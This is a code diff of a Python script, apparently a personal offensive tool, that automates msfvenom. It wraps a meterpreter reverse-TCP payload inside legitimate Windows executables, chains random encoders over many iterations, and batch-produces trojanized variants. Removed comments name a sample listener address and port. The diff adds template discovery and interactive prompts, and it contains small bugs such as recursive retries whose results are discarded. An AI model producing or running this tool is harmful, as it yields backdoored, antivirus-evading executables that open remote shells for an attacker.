@@ -7,6 +7,7 @@ Artur Matias
 mfsvenom generator
 """
 
+import glob
 import os
 import random
 
@@ -14,24 +15,24 @@ def banner():
     print("#------------------------------------------------------------------------------#") 
     print("|        Artur Matias                                        2021-08-01        |")
     print("#------------------------------------------------------------------------------#")
-
-def create_folder():
-    os.system("mkdir -p \"" + executable + "\"")
-
-def generate_venom(n_file, n_raws):
+"""
+def create_folder(n_exe):
+    #os.system("mkdir -p \"" + executable[n_exe] + "\"")
+"""
+def generate_venom(n_file, n_raws, n_exe):
     #venom = ''
     try:
         if n_raws == 1:
-            venom = venom_single(n_file)
+            venom = venom_single(n_file, n_exe)
 
         elif n_raws == 2:
-            venom = venom_start() + venom_end(n_file)
+            venom = venom_start() + venom_end(n_file, n_exe)
 
         elif n_raws >= 3:
             venom = venom_start()
             for _ in range(n_raws):
                 venom += raw()
-            venom += venom_end(n_file)
+            venom += venom_end(n_file, n_exe)
 
         print("\nExecuting:\n" + venom + "\n")
         os.system(venom)
@@ -42,16 +43,16 @@ def generate_venom(n_file, n_raws):
 
     
 
-def run():
-    create_folder()
-
+def run(n_files):
     for n_file in range(n_files):
         n_file += 1
-        generate_venom(n_file, r_raws())
+        for n_exe in range(len(executable)):
+            #create_folder(n_exe)
+            generate_venom(n_file, r_raws(), n_exe)
 
 
-def venom_single(n_file):
-    venom_single = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + executable + ".exe -f " + f + " -o ./" + executable + "/" + executable + "-" + str(n_file) + ".exe"
+def venom_single(n_file, n_exe):
+    venom_single = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + arch + "/" + executable[n_exe] + ".exe -f " + f + " -o ./generated/" + executable[n_exe] + "-" + arch + "-" + str(n_file) + ".exe"
     return venom_single
 
 
@@ -65,8 +66,8 @@ def raw():
     return raw
 
 
-def venom_end(n_file):
-    venom_end = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + executable + ".exe -f " + f + " -o ./" + executable + "/" + executable + "-" + str(n_file) + ".exe"
+def venom_end(n_file, n_exe):
+    venom_end = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + arch + "/" + executable[n_exe] + ".exe -f " + f + " -o ./generated/" + executable[n_exe] + "-" + arch + "-" + str(n_file) + ".exe"
     return venom_end
 
 
@@ -96,8 +97,9 @@ def get_arch():
     elif answer == '2':
         arch = 'x64'
     else:
-        print("Invalid option, defaulting to x86")
+        print("Invalid option!\n")
         arch = 'x86'
+        get_arch()
 
     return arch
 
@@ -129,12 +131,16 @@ def get_lport():
     return lport
 
 
-def get_executable():
-    if arch == "x86":
-        executable = 'wa32'
-    elif arch == "x64":
-        executable =  'wa64'
-    
+def get_executable(arch):
+
+    executable = [os.path.basename(a) for a in glob.glob(arch + '/*.exe')]
+    for index,exe in enumerate(executable):
+        new = os.path.splitext(exe)[0]
+        executable[index] = new
+
+    if not executable:
+        print("No executable files found!")
+
     return executable
 
 
@@ -154,32 +160,39 @@ def get_encoders():
 def get_format():
     if arch == "x86":
         f = 'exe'
-        print(f, arch)
     elif arch == "x64":
         f = 'exe-only'
-        print(f, arch)
     
     return f
+
+
+def get_n_files():
+    print("\nHow many files do you want to generate?")
+    answer = input('> ')
+    n_files = 0
+    print(answer)
+    try:
+        n_files = int(answer)
+
+    except ValueError:
+        print("Invalid option!\n")
+        get_n_files()
+
+
+    
+    return n_files
 
 if __name__ == "__main__":
 
     banner()
 
-    #arch = 'x64'
-    #platform = 'windows'
-    #payload = 'windows/x64/meterpreter/reverse_tcp'
-    #lhost = '192.168.50.156'
-    #lport = '443'
-    #executable = 'wa64'
-    #format = 'exe-only'
-    #encoders = ["xor", "xor_context", "xor_dynamic", "zutto_dekiru"]
-
     arch = get_arch()
+    n_files = get_n_files()
     platform = get_platform()
     payload = get_payload()
     lhost = get_lhost()
     lport = get_lport()
-    executable = get_executable()
+    executable = get_executable(arch)
     encoders = get_encoders()
     f = get_format()
 
@@ -190,7 +203,15 @@ if __name__ == "__main__":
     max_r_iterations = 200
 
     # How many executables will be generated
-    n_files = 5
+    #n_files = 3
+    print("Arch: " + arch)
+    print("n_files: " + str(n_files))
+    print("platform: " + platform)
+    print("payload: " + payload)
+    print("lhost: " + lhost)
+    print("lport: " + lport)
+    print("format: " + f)
+    print("encoders: " + [print(x for x in encoders)])
 
 
-    run()
+    run(n_files)
